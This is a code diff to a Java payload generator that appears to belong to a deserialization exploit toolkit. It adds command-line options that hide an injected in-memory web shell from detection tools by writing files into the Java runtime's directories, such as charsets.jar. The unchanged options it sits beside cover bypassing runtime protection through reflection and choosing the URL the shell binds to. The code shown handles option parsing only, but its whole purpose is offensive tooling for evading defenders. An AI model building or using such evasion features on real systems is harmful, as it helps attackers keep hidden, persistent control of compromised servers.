@@ -33,6 +33,8 @@ public class GeneratePayload {
 		options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
 		options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not");
 		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/su18]");
+		options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools by writing file to $JAVA_HOME,only support SpringControllerMS currently");
+		options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
 		options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
 
 		CommandLineParser parser = new DefaultParser();
@@ -68,6 +70,14 @@ public class GeneratePayload {
 				url = "/" + url;
 			}
 			URL_PATTERN = url;
+		}
+
+		if (cmdLine.hasOption("hide-mem-shell")) {
+			HIDE_MEMORY_SHELL = true;
+
+			if (cmdLine.hasOption("hide-type")) {
+				HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
+			}
 		}
 
 		final String payloadType = cmdLine.getOptionValue("gadget");
